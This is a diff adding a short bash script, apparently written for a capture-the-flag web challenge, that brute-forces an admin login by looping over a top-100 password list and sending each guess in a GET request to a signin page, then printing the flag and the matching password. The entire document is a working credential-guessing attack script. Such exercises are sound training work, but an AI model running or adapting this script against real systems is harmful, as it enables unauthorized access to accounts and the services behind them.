@@ -1,0 +1,21 @@
+#!/usr/bin/env bash
+
+RED="\033[31;1m"
+GREEN="\033[32;1m"
+RESET="\033[0m"
+
+if [ -z "$1" ]; then
+	echo "Merci de mettre l'adresse ip de la machine".
+	exit 1;
+fi
+for line in $(cat ./top100.txt)
+do
+	flag=$(curl -s -X GET  "http://$1/?page=signin&username=admin&password=${line}&Login=Login" | grep flag)
+	if [ ! -z "${flag}" ]; then
+		echo -e "${GREEN}SUCCESS${RESET}"
+		echo "The flag is: $(echo ${flag}| cut -d ' ' -f6) and the password is: $line"
+		exit 1;
+	else
+		echo -e "${RED}FAIL with password: ${line} ${RESET}"
+	fi
+done
